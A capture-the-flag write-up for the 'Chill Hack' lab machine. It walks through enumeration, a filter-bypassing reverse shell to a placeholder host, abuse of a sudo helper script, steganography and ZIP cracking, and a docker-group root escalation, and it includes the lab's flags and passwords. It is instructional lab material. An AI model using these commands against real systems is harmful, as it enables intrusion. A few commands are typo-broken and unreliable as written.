# Chill Hack

## Nmap

```bash
nmap -p- -T4 <IP> -vv 
```

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 (Ubuntu)
```

First we go to the ftp and login as anonymous and we see a file named `note.txt`.
We take it and open it up and see:

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

We see that there is something going on with some backend stuff. This will help us later.

---

## Gobuster

We go to the web server first and we enumerate using gobuster.

<img width="1853" height="1007" alt="Screenshot From 2025-09-01 20-50-46" src="https://github.com/user-attachments/assets/95e17474-b6a2-4117-ba8d-5654d322e708" />

```bash
gobuster dir -u http://chill.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```

This is what we found:

```
/images               (Status: 301) [Size: 307] -> http://chill.thm/images/
/css                  (Status: 301) [Size: 304] -> http://chill.thm/css/
/js                   (Status: 301) [Size: 303] -> http://chill.thm/js/
/fonts                (Status: 301) [Size: 306] -> http://chill.thm/fonts/
/secret               (Status: 301) [Size: 307] -> http://chill.thm/secret/
/server-status        (Status: 403) [Size: 274]
```

So let’s go to `http://chill.thm/secret` and see what’s up with that.

<img width="1853" height="1007" alt="Screenshot From 2025-09-01 20-57-23" src="https://github.com/user-attachments/assets/21dcab7c-f879-44cc-a738-6459e6b66a9b" />


When typing “Hello” we get this.

Looking into the path of the server we see that there is a `/image` and after looking we see two gifs. One of the boy and one that is called `FailingMiserableEwe-size_restricted.gif`.

<img width="1853" height="1007" alt="Screenshot From 2025-09-01 21-04-35" src="https://github.com/user-attachments/assets/c52e0db3-d663-48ae-858d-bd783d9aad51" />

Let’s see if we can trigger that.

Typing `ls` we get the red gif but typing `whoami` we get the boy. Let’s see what else we can do. Going back to the hint we see that since some strings are locked and prevented from running we can run string obfuscation to bypass command filters.

This is fancy talk for: it’s a way to sneak blocked commands past a filter by splitting them up. So we can run a listener and then a reverse shell split up.

```bash
nc -lvnp 4444
```

```bash
ba''sh -c 'ba''sh -i >& /dev/tcp/MACHINE_IP/4444 0>&1'
```

Now that we are in we can do this to stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL ^Z
stty raw -echo && fg
export TERM=xterm
```

After looking around we see that we have 3 users: `anurodh`, `apaar`, `aurick`.
But we can only get into `apaar` and even then we can’t read the file in there. So we run `sudo -l`.

```bash
www-data@ip-10-201-23-34:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ip-10-201-23-34:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on ip-10-201-23-34:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

---

## Privilege Escalation: www-data → apaar

We can run `helpline.sh`. First we see what the file is all about and we see:

```abap
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

If you notice `$msg 2>/dev/null` we can exploit that since it executes whatever you type as a command. We can escalate from there.

So we can type the name and then `cat local.txt` to get the first flag!

> {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

```abap
www-data@ip-10-201-23-34:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: apaar
Hello user! I am apaar,  Please enter your message: cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
Thank you for your precious time!
www-data@ip-10-201-23-34:/home/apaar$
```

---

## Recon & Steganography Clue

Now to escalate privileges. Going back to doing recon I found this:

```abap
www-data@ip-10-201-23-34:/var/www/files$ ls
account.php  hacker.php  images  index.php  style.css
www-data@ip-10-201-23-34:/var/www/files$ cat hacker.php 
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
www-data@ip-10-201-23-34:/var/www/files$ 
```

This looks like a clue:

```abap
Look in the dark! You will find your answer
```

---

## Objective

We found a hint “Look in the dark!” in `hacker.php`. That suggested steganography. We exposed the image directory from the target, downloaded the image to our box, extracted hidden data with stego tools, cracked a ZIP password, and recovered `source_code.php` for further analysis.

---

## Environment

* Target (web server): `10.201.23.34` (you had a web shell / command exec as `www-data`)
* Attack box (your machine): `10.201.113.125`

---

## Steps and commands

### 1) On the target: serve the images directory over HTTP

```bash
# Move to the parent folder that contains "images"
cd /var/www/files

# Quick sanity check: make sure the files are present
ls -la
ls -la images

# Start a simple HTTP file server on port 8000 (background)
python3 -m http.server 8000 --bind 0.0.0.
```

### 2) On your box: download and verify you hit the right path

```bash
# Probe that the file is reachable from your box (expect 200 OK)
curl -I http://10.201.23.34:8000/images/hacker-with-laptop_23-2147985341.jpg

# Download the file
wget http://10.201.23.34:8000/images/hacker-with-laptop_23-2147985341.jpg -O hacker.jpg
```

Tip if you get a 404 here: you probably started the server inside `images/`. In that case the correct URL is without `/images/`:

```bash
# Use this variant only if the server was started inside /var/www/files/images
wget http://10.201.23.34:8000/hacker-with-laptop_23-2147985341.jpg -O hacker.j
```

### 3) On your box: extract hidden data from the image

```bash
# Try extracting embedded data with steghide (press Enter for passphrase first try)
steghide extract -sf hacker.jpg -xf hidden_data.txt

# Identify what was extracted
file hidden_data.txt

# List contents if it is a ZIP
unzip -l hidden_data.txt
```

In our run, `hidden_data.txt` was a ZIP containing `source_code.php` and required a password.

### 4) Crack the ZIP password and extract

```bash
# Create a crackable hash from the ZIP
zip2john hidden_data.txt > zip.hash

# Crack using rockyou
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Show the cracked password (we recovered: pass1word)
john --show zip.hash
```

Now extract with the recovered password:

```bash
# Use the cracked password to extract
unzip -P pass1word -o hidden_data.txt -d extracted

# Verify the file is present
ls -l extracted
file extracted/source_code.php

# Quick PHP syntax check and preview
php -l extracted/source_code.php
sed -n '1,120p' extracted/source_code.php
```

After opening the `source_code.php` we see there’s a password that has been encoded:

```abap
if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
```

Which decodes into:

```
!d0ntKn0wmYp@ssw0rd
```

We also get a hint: it’s the password for Anurodh.

```abap
echo "Welcome Anurodh!";
```

So now we ssh using his name and password.

---

## PrivEsc via Docker group (`/var/run/docker.sock`)

### Summary

I confirmed the user `anurodh` is in the `docker` group. Membership in this group lets me talk to the Docker daemon and mount the host filesystem into a container. I launched a container with the host `/` mounted at `/mnt`, then `chroot`’d into it for a root shell on the host. From there, I read `local.txt` and `proof.txt`.

### Steps

```bash
# Confirm my identity and group membership (docker group present)
id
# uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

# See what images are already cached locally (helpful if pulls are blocked)
docker images

# Shell as root on the host via Docker: mount host / at /mnt and chroot into it
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Verification and loot (inside the chrooted shell)

```bash
# Verify effective control on the host
whoami

# Read flags
cat /home/apaar/local.txt
cat /root/proof.txt
```

> {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

---

Do you want me to now go back and **retrofit your older write-ups** (like TakeOver, Cage, Skynet, etc.) into this same “everything included, no trimming” style — so your GitHub repo has consistent full-detail posts?
